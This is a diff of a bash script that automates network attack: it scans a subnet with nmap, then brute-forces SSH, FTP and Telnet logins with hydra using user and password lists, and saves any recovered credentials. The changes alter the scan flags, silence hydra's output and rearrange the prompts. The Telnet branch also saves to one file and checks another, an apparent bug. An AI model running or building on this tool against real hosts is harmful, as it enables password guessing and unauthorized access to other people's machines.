@@ -37,7 +37,7 @@ printf "[i] Found localhost: %s$localhost, whitelisting...\n"
 
 
 # ips=($(nmap -sn  $gateway | awk '/is up/ {print up}; {gsub (/\(|\)/,""); up = $NF}' | sort)) #ips array
-mapfile -t ips < <(nmap -sn "$gateway" | awk '/is up/ {print up}; {gsub (/\(|\)/,""); up = $NF}' | sort)
+mapfile -t ips < <(nmap "$gateway" -PS --disable-arp-ping | awk '/is up/ {print up}; {gsub (/\(|\)/,""); up = $NF}' | sort)
 ips=(${ips[@]/$localhost})
 
 # nmap -vv $ips[$i] | grep "Discovered open port" | awk {'print $6":"$4'} | awk -F/ {'print $1'} 
@@ -93,15 +93,15 @@ do
             if [ "${ports[$y]}" == "22" ]
             then 
                 printf "[i] \e[92mSSH\e[0m service detected!\n"
-                hydra -L "$user" -P "$pass" -I "${ips[$i]}" ssh -f -o hydra_ssh.txt
-                if test -f "hydra_ssh.txt" && grep -q "login" "hydra_ssh.txt"; then
+                hydra -L "$user" -P "$pass" -I "${ips[$i]}" ssh -f -o hydra_ssh.txt >/dev/null
+                if test -f "hydra_ssh.txt" && grep -q "login" "hydra_ssh.txt"; then 
                     printf "\n[i] CREDINENTIALS:\n\e[92m"	
                     cat hydra_ssh.txt | awk '/login/{print $3" "$5":" $7}'
                     printf "\e[0m"
+                    read -p "Press [ENTER] to continue!"
                 else 
                     printf "\n[i] CREDINENTIALS NOT FOUND :(\n"	
                 fi
-                read -p "Press [ENTER] to continue!"
             # elif [ "${ports[$y]}" == "443" ]
             # then 
             #     printf "[i] \e[92mHTTPS\e[0m service detected!\n"
@@ -109,15 +109,15 @@ do
             elif [ "${ports[$y]}" == "21" ]
             then 
                 printf "[i] \e[92mFTP\e[0m service detected!\n"
-                hydra -L "$user" -P "$pass" -I "${ips[$i]}" ftp -f -o hydra_ftp.txt
+                hydra -L "$user" -P "$pass" -I "${ips[$i]}" ftp -f -o hydra_ftp.txt >/dev/null
                 if test -f "hydra_ftp.txt" && grep -q "login" "hydra_ftp.txt"; then
                     printf "\n[i] CREDINENTIALS:\n\e[92m"	
                     cat hydra_ftp.txt | awk '/login/{print $3" "$5":" $7}'
                     printf "\e[0m"
+                    read -p "Press [ENTER] to continue!"
                 else 
                     printf "\n[i] CREDINENTIALS NOT FOUND :(\n"	
                 fi
-                read -p "Press [ENTER] to continue!"
               
             elif [ "${ports[$y]}" == "5963" ]
             then 
@@ -128,15 +128,16 @@ do
             elif [ "${ports[$y]}" == "23" ]
             then 
                 printf "[i] \e[92mTELNET\e[0m service detected!\n"
-                hydra -L "$user" -P "$pass" -I "${ips[$i]}" telnet -f -o hydra_ftp.txt
+                hydra -L "$user" -P "$pass" -I "${ips[$i]}" telnet -f -o hydra_ftp.txt >/dev/null
                 if test -f "hydra_telnet.txt" && grep -q "login" "hydra_telnet.txt"; then
                     printf "\n[i] CREDINENTIALS:\n\e[92m"	
                     cat hydra_telnet.txt | awk '/login/{print $3" "$5":" $7}'
                     printf "\e[0m"
+                    read -p "Press [ENTER] to continue!"
                 else 
                     printf "\n[i] CREDINENTIALS NOT FOUND :(\n"	
                 fi
-                read -p "Press [ENTER] to continue!"
+               
             # elif [ "${ports[$y]}" == "445" ]
 
             # then 
@@ -165,19 +166,21 @@ save_creds(){
     mv *.txt creds/
 }
 printf "\n"
-read -p "[?] Save credinentials to file? This will overwrite existing one (y/n): "  clean
 
+
+read -p "[?] Save credinentials to file? This will overwrite existing one (y/n): "  clean
 case $clean in
-    [yY]|[yY][eE][sS])
+[yY]|[yY][eE][sS])
     save_creds ;;
     
-    [nN]|[nN][oO]) 
-    rm *.txt
-    exit ;;
+[nN]|[nN][oO]) 
+    rm *.txt ;;
     
-    *) printf "\n[!] Incorrect choice!"; 
+*) 
+    printf "\n[!] Incorrect choice!"; 
     save_creds ;;
 esac
+
 
 printf "\n\n[*] Quiting...\n" 
 
